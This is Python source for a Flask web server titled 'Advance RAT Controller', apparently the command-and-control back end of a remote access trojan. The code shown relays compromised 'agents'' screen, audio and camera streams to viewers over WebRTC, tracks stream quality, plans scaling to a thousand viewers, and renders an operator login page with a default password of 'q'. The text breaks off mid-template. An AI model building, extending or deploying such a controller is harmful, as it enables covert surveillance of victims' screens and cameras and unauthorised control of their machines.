#final controller
import eventlet
eventlet.monkey_patch()

from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, session, flash, render_template_string, render_template
from flask_socketio import SocketIO, emit, join_room, leave_room
from collections import defaultdict
import datetime
import time
import os
import base64
import queue
import hashlib
import hmac
import secrets
import threading
import os
import base64

# WebRTC imports for SFU functionality
try:
    import asyncio
    import aiortc
    from aiortc import RTCPeerConnection, RTCSessionDescription, MediaStreamTrack
    from aiortc.contrib.media import MediaPlayer, MediaRecorder
    from aiortc.mediastreams import MediaStreamError
    WEBRTC_AVAILABLE = True
    print("WebRTC (aiortc) support enabled")
except ImportError:
    WEBRTC_AVAILABLE = False
    print("WebRTC (aiortc) not available - falling back to Socket.IO streaming")

# Configuration Management
class Config:
    """Configuration class for Advance RAT Controller"""
    
    # Admin Authentication
    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'q')
    
    # Flask Configuration
    SECRET_KEY = os.environ.get('SECRET_KEY', None)
    
    # Server Configuration
    HOST = os.environ.get('HOST', '0.0.0.0')
    PORT = int(os.environ.get('PORT', 8080))
    
    # Security Settings
    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour in seconds
    MAX_LOGIN_ATTEMPTS = int(os.environ.get('MAX_LOGIN_ATTEMPTS', 5))
    LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 300))  # 5 minutes lockout
    
    # Password Security Settings
    SALT_LENGTH = 32  # Length of salt in bytes
    HASH_ITERATIONS = 100000  # Number of iterations for PBKDF2

# Initialize Flask app with configuration
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use config or generate secure random key
socketio = SocketIO(app, async_mode='eventlet')

# WebRTC Configuration
WEBRTC_CONFIG = {
    'enabled': WEBRTC_AVAILABLE,
    'ice_servers': [
        {'urls': 'stun:stun.l.google.com:19302'},
        {'urls': 'stun:stun1.l.google.com:19302'},
        {'urls': 'stun:stun2.l.google.com:19302'},
        {'urls': 'stun:stun3.l.google.com:19302'},
        {'urls': 'stun:stun4.l.google.com:19302'}
    ],
    'codecs': {
        'video': ['VP8', 'VP9', 'H.264'],
        'audio': ['Opus', 'PCM']
    },
    'simulcast': True,
    'svc': True,
    'bandwidth_estimation': True,
    'adaptive_bitrate': True,
    'frame_dropping': True,
    'quality_levels': {
        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
    },
    'performance_tuning': {
        'keyframe_interval': 2,  # seconds
        'disable_b_frames': True,
        'ultra_low_latency': True,
        'hardware_acceleration': True,
        'gop_size': 60,  # frames at 30fps = 2 seconds
        'max_bitrate_variance': 0.3  # 30% variance allowed
    },
    'monitoring': {
        'connection_quality_metrics': True,
        'automatic_reconnection': True,
        'detailed_logging': True,
        'stats_interval': 1000,  # ms
        'quality_thresholds': {
            'min_bitrate': 100000,  # 100 kbps
            'max_latency': 1000,    # 1 second
            'min_fps': 15
        }
    }
}

# WebRTC Global State
WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
WEBRTC_STREAMS = {}  # agent_id -> {screen, audio, camera} streams
WEBRTC_VIEWERS = {}  # viewer_id -> {agent_id, pc, streams}

# Production Scale Configuration
PRODUCTION_SCALE = {
    'current_implementation': 'aiortc_sfu',  # Current: aiortc-based SFU
    'target_implementation': 'mediasoup',    # Target: mediasoup for production scale
    'migration_phase': 'planning',           # Current phase: planning
    'scalability_limits': {
        'aiorttc_max_viewers': 50,           # aiortc suitable for smaller setups
        'mediasoup_max_viewers': 1000,       # mediasoup for production scale
        'concurrent_agents': 100,            # Maximum concurrent agents
        'bandwidth_per_agent': 10000000      # 10 Mbps per agent
    },
    'performance_targets': {
        'target_latency': 100,               # 100ms target latency
        'target_bitrate': 5000000,           # 5 Mbps target bitrate
        'target_fps': 30,                    # 30 FPS target
        'max_packet_loss': 0.01              # 1% max packet loss
    }
}

# Security Configuration and Password Management
def generate_salt():
    """Generate a cryptographically secure salt"""
    return secrets.token_bytes(Config.SALT_LENGTH)

def hash_password(password, salt=None):
    """
    Hash a password using PBKDF2 with SHA-256
    
    Args:
        password (str): The password to hash
        salt (bytes, optional): Salt to use. If None, generates a new salt
    
    Returns:
        tuple: (hashed_password, salt) where both are base64 encoded strings
    """
    if salt is None:
        salt = generate_salt()
    elif isinstance(salt, str):
        salt = base64.b64decode(salt)
    
    # Use PBKDF2 with SHA-256 for secure password hashing
    import hashlib
    import hmac
    
    # Create the hash using PBKDF2
    hash_obj = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        Config.HASH_ITERATIONS
    )
    
    # Return base64 encoded hash and salt
    return base64.b64encode(hash_obj).decode('utf-8'), base64.b64encode(salt).decode('utf-8')

def verify_password(password, stored_hash, stored_salt):
    """
    Verify a password against a stored hash and salt
    
    Args:
        password (str): The password to verify
        stored_hash (str): The stored hash (base64 encoded)
        stored_salt (str): The stored salt (base64 encoded)
    
    Returns:
        bool: True if password matches, False otherwise
    """
    try:
        # Hash the provided password with the stored salt
        hash_obj, _ = hash_password(password, stored_salt)
        return hmac.compare_digest(hash_obj, stored_hash)
    except Exception as e:
        print(f"Password verification error: {e}")
        return False

def create_secure_password_hash(password):
    """
    Create a secure hash for a password
    
    Args:
        password (str): The password to hash
    
    Returns:
        tuple: (hash, salt) both base64 encoded
    """
    return hash_password(password)

# Generate secure hash for admin password
ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT = create_secure_password_hash(Config.ADMIN_PASSWORD)

# WebRTC Utility Functions
def create_webrtc_peer_connection(agent_id):
    """Create a WebRTC peer connection for an agent"""
    if not WEBRTC_AVAILABLE:
        return None
    
    try:
        pc = RTCPeerConnection()
        
        # Configure ICE servers
        for ice_server in WEBRTC_CONFIG['ice_servers']:
            pc.addIceServer(ice_server)
        
        # Store the peer connection
        WEBRTC_PEER_CONNECTIONS[agent_id] = pc
        
        # Set up event handlers
        @pc.on("connectionstatechange")
        async def on_connectionstatechange():
            print(f"WebRTC connection state for {agent_id}: {pc.connectionState}")
            if pc.connectionState == "failed":
                await pc.close()
                if agent_id in WEBRTC_PEER_CONNECTIONS:
                    del WEBRTC_PEER_CONNECTIONS[agent_id]
        
        @pc.on("iceconnectionstatechange")
        async def on_iceconnectionstatechange():
            print(f"ICE connection state for {agent_id}: {pc.iceConnectionState}")
        
        @pc.on("track")
        async def on_track(track):
            print(f"Received {track.kind} track from {agent_id}")
            if agent_id not in WEBRTC_STREAMS:
                WEBRTC_STREAMS[agent_id] = {}
            WEBRTC_STREAMS[agent_id][track.kind] = track
            
            # Forward track to all viewers of this agent
            for viewer_id, viewer_data in WEBRTC_VIEWERS.items():
                if viewer_data['agent_id'] == agent_id:
                    try:
                        sender = viewer_data['pc'].addTrack(track)
                        viewer_data['streams'][track.kind] = sender
                    except Exception as e:
                        print(f"Error forwarding track to viewer {viewer_id}: {e}")
        
        return pc
    except Exception as e:
        print(f"Error creating WebRTC peer connection for {agent_id}: {e}")
        return None

def close_webrtc_connection(agent_id):
    """Close WebRTC connection for an agent"""
    if agent_id in WEBRTC_PEER_CONNECTIONS:
        try:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
            # Use run_coroutine_threadsafe for synchronous context
            try:
                loop = asyncio.get_event_loop()
                asyncio.run_coroutine_threadsafe(pc.close(), loop)
            except RuntimeError:
                # No event loop running, use asyncio.run
                asyncio.run(pc.close())
            del WEBRTC_PEER_CONNECTIONS[agent_id]
        except Exception as e:
            print(f"Error closing WebRTC connection for {agent_id}: {e}")
    
    if agent_id in WEBRTC_STREAMS:
        del WEBRTC_STREAMS[agent_id]

def get_webrtc_stats(agent_id):
    """Get WebRTC statistics for an agent"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        stats = {
            'connection_state': pc.connectionState,
            'ice_connection_state': pc.iceConnectionState,
            'ice_gathering_state': pc.iceGatheringState,
            'signaling_state': pc.signalingState,
            'local_description': pc.localDescription.sdp if pc.localDescription else None,
            'remote_description': pc.remoteDescription.sdp if pc.remoteDescription else None
        }
        return stats
    except Exception as e:
        print(f"Error getting WebRTC stats for {agent_id}: {e}")
        return None

# Advanced WebRTC Performance Optimization Functions
def estimate_bandwidth(agent_id):
    """Estimate available bandwidth for an agent connection"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        # Get RTCStatsReport for bandwidth estimation
        try:
            loop = asyncio.get_event_loop()
            future = asyncio.run_coroutine_threadsafe(pc.getStats(), loop)
            stats_report = future.result(timeout=5)  # 5 second timeout
        except RuntimeError:
            # No event loop, run synchronously
            stats_report = asyncio.run(pc.getStats())
        
        bandwidth_stats = {
            'available_bandwidth': 0,
            'current_bitrate': 0,
            'packets_lost': 0,
            'rtt': 0,
            'jitter': 0
        }
        
        for stat in stats_report.values():
            if hasattr(stat, 'type'):
                if stat.type == 'inbound-rtp' and stat.mediaType == 'video':
                    bandwidth_stats['current_bitrate'] = getattr(stat, 'bytesReceived', 0) * 8 / 1000  # kbps
                    bandwidth_stats['packets_lost'] = getattr(stat, 'packetsLost', 0)
                elif stat.type == 'candidate-pair' and stat.state == 'succeeded':
                    bandwidth_stats['rtt'] = getattr(stat, 'currentRoundTripTime', 0) * 1000  # ms
                    bandwidth_stats['jitter'] = getattr(stat, 'jitter', 0) * 1000  # ms
        
        # Estimate available bandwidth based on current performance
        if bandwidth_stats['packets_lost'] > 0:
            # Reduce bitrate if packet loss detected
            bandwidth_stats['available_bandwidth'] = max(
                bandwidth_stats['current_bitrate'] * 0.8,
                WEBRTC_CONFIG['quality_levels']['low']['bitrate']
            )
        else:
            # Increase bitrate if no packet loss
            bandwidth_stats['available_bandwidth'] = min(
                bandwidth_stats['current_bitrate'] * 1.2,
                WEBRTC_CONFIG['quality_levels']['high']['bitrate']
            )
        
        return bandwidth_stats
        
    except Exception as e:
        print(f"Error estimating bandwidth for {agent_id}: {e}")
        return None

def adaptive_bitrate_control(agent_id, current_quality='auto'):
    """Implement adaptive bitrate control based on network conditions"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Determine optimal quality level based on bandwidth
        available_bandwidth = bandwidth_stats['available_bandwidth']
        current_bitrate = bandwidth_stats['current_bitrate']
        
        # Quality selection logic
        if available_bandwidth >= WEBRTC_CONFIG['quality_levels']['high']['bitrate']:
            optimal_quality = 'high'
        elif available_bandwidth >= WEBRTC_CONFIG['quality_levels']['medium']['bitrate']:
            optimal_quality = 'medium'
        else:
            optimal_quality = 'low'
        
        # Check if quality change is needed
        if current_quality != optimal_quality:
            print(f"Adaptive bitrate: Changing quality from {current_quality} to {optimal_quality}")
            print(f"Available bandwidth: {available_bandwidth:.0f} kbps, Current: {current_bitrate:.0f} kbps")
            
            # Emit quality change command to agent
            socketio.emit('webrtc_quality_change', {
                'agent_id': agent_id,
                'quality': optimal_quality,
                'bandwidth_stats': bandwidth_stats
            })
            
            return optimal_quality
        
        return current_quality
        
    except Exception as e:
        print(f"Error in adaptive bitrate control for {agent_id}: {e}")
        return None

def implement_frame_dropping(agent_id, load_threshold=0.8):
    """Implement intelligent frame dropping under high load"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return False
    
    try:
        # Get current system load
        import psutil
        cpu_percent = psutil.cpu_percent(interval=1)
        memory_percent = psutil.virtual_memory().percent
        
        # Check if we're under high load
        if cpu_percent > (load_threshold * 100) or memory_percent > (load_threshold * 100):
            print(f"High load detected: CPU {cpu_percent:.1f}%, Memory {memory_percent:.1f}%")
            
            # Emit frame dropping command to agent
            socketio.emit('webrtc_frame_dropping', {
                'agent_id': agent_id,
                'enabled': True,
                'drop_ratio': 0.3,  # Drop 30% of frames
                'priority': 'keyframes_only'  # Keep keyframes, drop some intermediate frames
            })
            
            return True
        
        # Normal load - disable frame dropping
        socketio.emit('webrtc_frame_dropping', {
            'agent_id': agent_id,
            'enabled': False
        })
        
        return False
        
    except ImportError:
        print("psutil not available for load monitoring")
        return False
    except Exception as e:
        print(f"Error implementing frame dropping for {agent_id}: {e}")
        return False

def monitor_connection_quality(agent_id):
    """Monitor and log connection quality metrics"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Quality assessment
        quality_score = 100
        quality_issues = []
        
        # Check bitrate
        if bandwidth_stats['current_bitrate'] < WEBRTC_CONFIG['monitoring']['quality_thresholds']['min_bitrate']:
            quality_score -= 30
            quality_issues.append('Low bitrate')
        
        # Check latency
        if bandwidth_stats['rtt'] > WEBRTC_CONFIG['monitoring']['quality_thresholds']['max_latency']:
            quality_score -= 25
            quality_issues.append('High latency')
        
        # Check packet loss
        if bandwidth_stats['packets_lost'] > 0:
            quality_score -= 20
            quality_issues.append('Packet loss detected')
        
        # Check jitter
        if bandwidth_stats['jitter'] > 50:  # 50ms threshold
            quality_score -= 15
            quality_issues.append('High jitter')
        
        # Log quality metrics
        if WEBRTC_CONFIG['monitoring']['detailed_logging']:
            print(f"Connection Quality for {agent_id}:")
            print(f"  Quality Score: {quality_score}/100")
            print(f"  Current Bitrate: {bandwidth_stats['current_bitrate']:.0f} kbps")
            print(f"  RTT: {bandwidth_stats['rtt']:.1f} ms")
            print(f"  Jitter: {bandwidth_stats['jitter']:.1f} ms")
            print(f"  Packets Lost: {bandwidth_stats['packets_lost']}")
            if quality_issues:
                print(f"  Issues: {', '.join(quality_issues)}")
        
        return {
            'quality_score': quality_score,
            'bandwidth_stats': bandwidth_stats,
            'quality_issues': quality_issues,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
    except Exception as e:
        print(f"Error monitoring connection quality for {agent_id}: {e}")
        return None

def automatic_reconnection_logic(agent_id):
    """Implement automatic reconnection logic for failed connections"""
    if not WEBRTC_AVAILABLE:
        return False
    
    try:
        if agent_id in WEBRTC_PEER_CONNECTIONS:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
            
            # Check connection state
            if pc.connectionState == 'failed' or pc.connectionState == 'disconnected':
                print(f"WebRTC connection failed for {agent_id}, attempting reconnection...")
                
                # Close failed connection
                try:
                    loop = asyncio.get_event_loop()
                    asyncio.run_coroutine_threadsafe(pc.close(), loop)
                except RuntimeError:
                    asyncio.run(pc.close())
                del WEBRTC_PEER_CONNECTIONS[agent_id]
                
                # Wait before reconnection attempt
                import time
                time.sleep(2)
                
                # Attempt reconnection
                new_pc = create_webrtc_peer_connection(agent_id)
                if new_pc:
                    print(f"Reconnection successful for {agent_id}")
                    return True
                else:
                    print(f"Reconnection failed for {agent_id}")
                    return False
        
        return True
        
    except Exception as e:
        print(f"Error in automatic reconnection for {agent_id}: {e}")
        return False

# Production Scale Monitoring and Migration Functions
def assess_production_readiness():
    """Assess current system's readiness for production scale"""
    try:
        current_agents = len(WEBRTC_PEER_CONNECTIONS)
        current_viewers = len(WEBRTC_VIEWERS)
        total_connections = current_agents + current_viewers
        
        readiness_report = {
            'current_implementation': PRODUCTION_SCALE['current_implementation'],
            'target_implementation': PRODUCTION_SCALE['target_implementation'],
            'migration_phase': PRODUCTION_SCALE['migration_phase'],
            'current_usage': {
                'agents': current_agents,
                'viewers': current_viewers,
                'total_connections': total_connections
            },
            'scalability_assessment': {
                'aiortc_limit_reached': current_viewers >= PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'production_ready': current_viewers < PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'recommended_action': 'migrate_to_mediasoup' if current_viewers >= PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'] else 'continue_with_aiortc'
            },
            'performance_metrics': {},
            'recommendations': []
        }
        
        # Performance assessment
        if current_agents > 0:
            total_latency = 0
            total_bitrate = 0
            total_fps = 0
            agent_count = 0
            
            for agent_id in WEBRTC_PEER_CONNECTIONS:
                quality_data = monitor_connection_quality(agent_id)
                if quality_data:
                    total_latency += quality_data['bandwidth_stats']['rtt']
                    total_bitrate += quality_data['bandwidth_stats']['current_bitrate']
                    agent_count += 1
            
            if agent_count > 0:
                readiness_report['performance_metrics'] = {
                    'average_latency': total_latency / agent_count,
                    'average_bitrate': total_bitrate / agent_count,
                    'latency_target_met': (total_latency / agent_count) <= PRODUCTION_SCALE['performance_targets']['target_latency'],
                    'bitrate_target_met': (total_bitrate / agent_count) >= PRODUCTION_SCALE['performance_targets']['target_bitrate']
                }
        
        # Generate recommendations
        if readiness_report['scalability_assessment']['aiortc_limit_reached']:
            readiness_report['recommendations'].append('Immediate migration to mediasoup required for production scale')
        elif current_viewers > (PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'] * 0.8):
            readiness_report['recommendations'].append('Approaching aiortc limits, plan mediasoup migration')
        
        if readiness_report['performance_metrics'].get('latency_target_met') == False:
            readiness_report['recommendations'].append('Optimize network configuration to meet latency targets')
        
        if readiness_report['performance_metrics'].get('bitrate_target_met') == False:
            readiness_report['recommendations'].append('Check bandwidth allocation and codec settings')
        
        return readiness_report
        
    except Exception as e:
        print(f"Error assessing production readiness: {e}")
        return None

def generate_mediasoup_migration_plan():
    """Generate detailed migration plan from aiortc to mediasoup"""
    try:
        migration_plan = {
            'current_state': {
                'implementation': 'aiortc_sfu',
                'max_viewers': PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'technology': 'Python + aiortc'
            },
            'target_state': {
                'implementation': 'mediasoup_sfu',
                'max_viewers': PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers'],
                'technology': 'Node.js + mediasoup'
            },
            'migration_phases': [
                {
                    'phase': 1,
                    'name': 'Parallel Implementation',
                    'description': 'Implement mediasoup alongside existing aiortc',
                    'duration': '2-3 weeks',
                    'tasks': [
                        'Set up Node.js mediasoup server',
                        'Implement mediasoup SFU logic',
                        'Create migration endpoints',
                        'Test with subset of viewers'
                    ]
                },
                {
                    'phase': 2,
                    'name': 'Gradual Migration',
                    'description': 'Migrate viewers from aiortc to mediasoup',
                    'duration': '1-2 weeks',
                    'tasks': [
                        'Implement viewer routing logic',
                        'Add load balancing between aiortc and mediasoup',
                        'Monitor performance during migration',
                        'Handle fallback scenarios'
                    ]
                },
                {
                    'phase': 3,
                    'name': 'Full Migration',
                    'description': 'Complete migration to mediasoup',
                    'duration': '1 week',
                    'tasks': [
                        'Migrate all remaining viewers',
                        'Decommission aiortc implementation',
                        'Performance validation',
                        'Documentation updates'
                    ]
                }
            ],
            'technical_requirements': [
                'Node.js 18+ runtime',
                'mediasoup library installation',
                'Redis for session management',
                'Load balancer configuration',
                'Monitoring and alerting setup'
            ],
            'estimated_effort': '4-6 weeks',
            'risk_assessment': 'Medium - requires careful testing and rollback plan'
        }
        
        return migration_plan
        
    except Exception as e:
        print(f"Error generating mediasoup migration plan: {e}")
        return None

def enhanced_webrtc_monitoring():
    """Enhanced WebRTC monitoring with production-scale metrics"""
    try:
        monitoring_data = {
            'timestamp': datetime.datetime.now().isoformat(),
            'system_overview': {
                'total_agents': len(WEBRTC_PEER_CONNECTIONS),
                'total_viewers': len(WEBRTC_VIEWERS),
                'total_connections': len(WEBRTC_PEER_CONNECTIONS) + len(WEBRTC_VIEWERS),
                'system_load': {}
            },
            'performance_metrics': {},
            'quality_metrics': {},
            'scalability_metrics': {},
            'alerts': []
        }
        
        # System load monitoring
        try:
            import psutil
            monitoring_data['system_overview']['system_load'] = {
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory_percent': psutil.virtual_memory().percent,
                'network_io': psutil.net_io_counters()._asdict()
            }
        except ImportError:
            monitoring_data['system_overview']['system_load'] = {'error': 'psutil not available'}
        
        # Performance metrics per agent
        for agent_id in WEBRTC_PEER_CONNECTIONS:
            quality_data = monitor_connection_quality(agent_id)
            if quality_data:
                monitoring_data['performance_metrics'][agent_id] = quality_data
        
        # Quality assessment
        if monitoring_data['performance_metrics']:
            total_quality_score = sum(data['quality_score'] for data in monitoring_data['performance_metrics'].values())
            avg_quality_score = total_quality_score / len(monitoring_data['performance_metrics'])
            
            monitoring_data['quality_metrics'] = {
                'average_quality_score': avg_quality_score,
                'quality_distribution': {
                    'excellent': len([s for s in monitoring_data['performance_metrics'].values() if s['quality_score'] >= 90]),
                    'good': len([s for s in monitoring_data['performance_metrics'].values() if 70 <= s['quality_score'] < 90]),
                    'fair': len([s for s in monitoring_data['performance_metrics'].values() if 50 <= s['quality_score'] < 70]),
                    'poor': len([s for s in monitoring_data['performance_metrics'].values() if s['quality_score'] < 50])
                }
            }
        
        # Scalability assessment
        current_viewers = len(WEBRTC_VIEWERS)
        aiortc_limit = PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']
        
        monitoring_data['scalability_metrics'] = {
            'current_viewer_count': current_viewers,
            'aiortc_limit': aiortc_limit,
            'utilization_percentage': (current_viewers / aiortc_limit) * 100,
            'approaching_limit': current_viewers >= (aiortc_limit * 0.8),
            'limit_reached': current_viewers >= aiortc_limit
        }
        
        # Generate alerts
        if monitoring_data['scalability_metrics']['limit_reached']:
            monitoring_data['alerts'].append({
                'level': 'CRITICAL',
                'message': 'aiortc viewer limit reached - immediate migration required',
                'action': 'migrate_to_mediasoup'
            })
        elif monitoring_data['scalability_metrics']['approaching_limit']:
            monitoring_data['alerts'].append({
                'level': 'WARNING',
                'message': 'Approaching aiortc viewer limit - plan migration',
                'action': 'plan_migration'
            })
        
        # Quality alerts
        if monitoring_data['quality_metrics'].get('average_quality_score', 100) < 70:
            monitoring_data['alerts'].append({
                'level': 'WARNING',
                'message': 'Average connection quality below threshold',
                'action': 'investigate_network_issues'
            })
        
        return monitoring_data
        
    except Exception as e:
        print(f"Error in enhanced WebRTC monitoring: {e}")
        return None

# Session management and security tracking
LOGIN_ATTEMPTS = {}  # Track failed login attempts by IP

def is_authenticated():
    """Check if user is authenticated and session is valid"""
    print(f"Session check - authenticated: {session.get('authenticated', False)}")
    print(f"Session contents: {dict(session)}")
    
    if not session.get('authenticated', False):
        print("Not authenticated - returning False")
        return False
    
    # Check session timeout
    login_time = session.get('login_time')
    if login_time:
        try:
            # Handle both formats: with and without 'Z'
            if login_time.endswith('Z'):
                login_datetime = datetime.datetime.fromisoformat(login_time.replace('Z', '+00:00'))
            else:
                login_datetime = datetime.datetime.fromisoformat(login_time)
                # Assume UTC if no timezone info
                if login_datetime.tzinfo is None:
                    login_datetime = login_datetime.replace(tzinfo=datetime.timezone.utc)
            
            current_time = datetime.datetime.now(datetime.timezone.utc)
            if (current_time - login_datetime).total_seconds() > Config.SESSION_TIMEOUT:
                print("Session timeout - clearing session")
                session.clear()
                return False
        except Exception as e:
            print(f"Session authentication error: {e}")
            session.clear()
            return False
    
    print("Authentication successful - returning True")
    return True

def is_ip_blocked(ip):
    """Check if IP is blocked due to too many failed login attempts"""
    if ip in LOGIN_ATTEMPTS:
        attempts, last_attempt = LOGIN_ATTEMPTS[ip]
        if attempts >= Config.MAX_LOGIN_ATTEMPTS:
            # Check if lockout period has passed
            if (datetime.datetime.now() - last_attempt).total_seconds() < Config.LOGIN_TIMEOUT:
                return True
            else:
                # Reset attempts after timeout
                del LOGIN_ATTEMPTS[ip]
    return False

def record_failed_login(ip):
    """Record a failed login attempt for an IP"""
    if ip in LOGIN_ATTEMPTS:
        attempts, _ = LOGIN_ATTEMPTS[ip]
        LOGIN_ATTEMPTS[ip] = (attempts + 1, datetime.datetime.now())
    else:
        LOGIN_ATTEMPTS[ip] = (1, datetime.datetime.now())

def clear_login_attempts(ip):
    """Clear failed login attempts for an IP after successful login"""
    if ip in LOGIN_ATTEMPTS:
        del LOGIN_ATTEMPTS[ip]

def require_auth(f):
    """Decorator to require authentication for routes"""
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    client_ip = request.remote_addr
    
    # Check if IP is blocked
    if is_ip_blocked(client_ip):
        remaining_time = Config.LOGIN_TIMEOUT - (datetime.datetime.now() - LOGIN_ATTEMPTS[client_ip][1]).total_seconds()
        flash(f'Too many failed login attempts. Please try again in {int(remaining_time)} seconds.', 'error')
        return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Advance RAT Controller - Login Blocked</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-bg: #0a0a0f;
                --secondary-bg: #1a1a2e;
                --accent-blue: #00d4ff;
                --accent-purple: #6c5ce7;
                --accent-red: #ff4757;
                --text-primary: #ffffff;
                --text-secondary: #a0a0a0;
                --glass-bg: rgba(255, 255, 255, 0.05);
                --glass-border: rgba(255, 255, 255, 0.1);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
                color: var(--text-primary);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .login-container {
                background: var(--glass-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                text-align: center;
            }
            
            .login-header h1 {
                font-family: 'Orbitron', monospace;
                font-size: 2rem;
                font-weight: 900;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 20px;
            }
            
            .error-message {
                background: rgba(255, 71, 87, 0.2);
                color: var(--accent-red);
                border: 1px solid var(--accent-red);
                border-radius: 8px;
                padding: 20px;
                margin-bottom: 20px;
                font-weight: 500;
            }
            
            .retry-btn {
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                border: none;
                border-radius: 8px;
                padding: 12px 24px;
                color: white;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
            }
            
            .retry-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>Advance RAT Controller</h1>
            </div>
            
            <div class="error-message">
                <h3>🔒 Access Temporarily Blocked</h3>
                <p>Too many failed login attempts detected.</p>
                <p>Please wait before trying again.</p>
            </div>
            
            <a href="/login" class="retry-btn">Try Again</a>
        </div>
    </body>
    </html>
    ''')
    
    if request.method == 'POST':
        password = request.form.get('password', '')
        
        # Verify password using secure hash comparison
        if verify_password(password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            # Successful login
            clear_login_attempts(client_ip)
            session['authenticated'] = True
            session['login_time'] = datetime.datetime.now(datetime.timezone.utc).isoformat()
            session['login_ip'] = client_ip
            return redirect(url_for('dashboard'))
        else:
            # Failed login
            record_failed_login(client_ip)
            attempts = LOGIN_ATTEMPTS.get(client_ip, (0, None))[0]
            remaining_attempts = Config.MAX_LOGIN_ATTEMPTS - attempts
            
            if remaining_attempts > 0:
                flash(f'Invalid password. {remaining_attempts} attempts remaining.', 'error')
            else:
                flash(f'Too many failed attempts. Please wait {Config.LOGIN_TIMEOUT} seconds.', 'error')
    
    # Return login template as string since templates folder may not be available on Render
    login_template = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Advance RAT Controller - Login</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-bg: #0a0a0f;
                --secondary-bg: #1a1a2e;
                --accent-blue: #00d4ff;
                --accent-purple: #6c5ce7;
                --text-primary: #ffffff;
                --text-secondary: #a0a0a0;
                --glass-bg: rgba(255, 255, 255, 0.05);
                --glass-border: rgba(255, 255, 255, 0.1);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
                color: var(--text-primary);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .login-container {
                background: var(--glass-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }
            
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            
            .login-header h1 {
                font-family: 'Orbitron', monospace;
                font-size: 2rem;
                font-weight: 900;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
